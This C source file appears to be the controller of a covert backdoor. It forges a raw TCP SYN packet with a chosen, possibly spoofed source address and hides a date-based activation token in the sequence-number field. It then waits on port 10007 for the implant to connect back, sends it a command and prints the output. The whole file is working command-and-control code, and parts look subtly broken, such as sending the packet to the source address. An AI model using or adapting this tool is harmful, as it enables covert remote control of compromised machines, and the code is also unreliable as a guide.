#include "server.h"

int main (int argc, char *argv[])
{
    char errorBuffer[PCAP_ERRBUF_SIZE];
    char *keyword;
    char *command;
    bpf_u_int32 net;
    bpf_u_int32 mask;
    pcap_if_t *nics;
    pcap_if_t *nic;
    struct AddrInfo *addr;
    int opt, arg, n, bytes_to_read;
    time_t t;
    struct tm* tm;
    char Date[11];
    char *encryptedField, *bp, buf[80];
    int sd, recvsd, clientsd;
    // No data, just datagram
    char buffer[PCKT_LEN];
    // The size of the headers
    struct ip *iph = (struct ip *) buffer;
    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    socklen_t client_len;
    struct sockaddr_in client;

    time(&t);
    tm = localtime(&t);
    
    addr = malloc(sizeof(struct AddrInfo));
    memset(buffer, 0, PCKT_LEN);

    while ((opt = getopt (argc, argv, OPTIONS)) != -1)
    {
        switch (opt)
        {
            case 'h':
                addr->SrcHost = optarg;
                break;
                
            case 'd':
                addr->DstHost = optarg;		// Destination Host name
                break;
                
            case 'p':
                addr->dport = atoi (optarg);
                break;
                
            case 's':
                addr->sport = atoi (optarg);
                break;
                
            case 'c':
                command = optarg;
                break;
                
            default:
            case '?':
                exit(0);
        }
    }

    strftime(Date, sizeof Date, "%Y:%m:%d", tm);
    printf("%s\n", Date);
    
    keyword = strdup("comp");
    encryptedField = encrypt_data(keyword, Date);
    printf("'%s'\n", encryptedField);
    
    printf("as string: %s\nas unsigned: %u\n", encryptedField, encryptedField);
    /* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }
    
    /* Get the devices on the machine */
    if (pcap_findalldevs(&nics, errorBuffer) == -1)
    {
        systemFatal("Unable to retrieve device list");
    }
    
    /* Find a suitable NIC from the device list */
    for (nic = nics; nic; nic = nic->next)
    {
        if (pcap_lookupnet(nic->name, &net, &mask, errorBuffer) != -1)
        {
            break;
        }
    }
    
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sd < 0) {
        perror("socket() error");
        exit(-1);
    } else {
        printf("socket()-SOCK_RAW and tcp protocol is OK.\n");
    }
    

    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    sin.sin_port = htons(addr->sport);
    din.sin_port = htons(addr->dport);

    sin.sin_addr.s_addr = inet_addr((addr->SrcHost));
    din.sin_addr.s_addr = inet_addr((addr->DstHost));
    
    // IP structure
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;      // TCP
    iph->ip_sum = 0;    // Done by kernel
    
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
    
    // TCP structure
    tcph->th_sport = htons(addr->sport);
    tcph->th_dport = htons(addr->dport);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;	// Done by kernel
    tcph->th_urp = 0;
    
    // IP checksum calculation
    iph->ip_sum = csum((unsigned short *) buffer, (sizeof(struct ip) + sizeof(struct tcphdr)));
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        systemFatal("setsocketopt failed");
    }
    printf("Using:::::Source IP: %s port: %d, Target IP: %s port: %d.\n", (addr->SrcHost), addr->sport, (addr->DstHost), addr->dport);

    // Send the packet out
    if (sendto(sd, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    {
        systemFatal("sendto failed");
    }
    
    if ((recvsd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        systemFatal("Can't create a socket");
    }
    arg = 1;
    
    if (setsockopt(recvsd, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
    {
        systemFatal("setsockopt");
    }
    
    if (bind_address(10007, &recvsd) == -1)
    {
        systemFatal("bind error");
    }
    
    listen(recvsd, 5);
    
    while(TRUE)
    {
        client_len = sizeof(client);
        if((clientsd = accept(recvsd, (struct sockaddr *)&client, &client_len)) == -1)
        {
            fprintf(stderr,"cant accept cleint\n");
            exit(1);
        }
        printf("Connected IP: %s\n", inet_ntoa(client.sin_addr));
        
        // send command
        send(clientsd, command, 80, 0);
        
        //receive response
        bp = buf;
        bytes_to_read = 80;
        
            while((n = recv(clientsd, bp, bytes_to_read, 0)) > 0 )
            {
                bp += n;
                bytes_to_read -= n;
                printf("%s\n",buf);
            }
            printf("%d\n", n);

    }
    close(clientsd);
    close(recvsd);
    close(sd);
    
    free(addr);
    
    return 0;
}

// Simple checksum function, may use others such as Cyclic Redundancy Check, CRC
unsigned short csum(unsigned short *buf, int len)
{
    unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}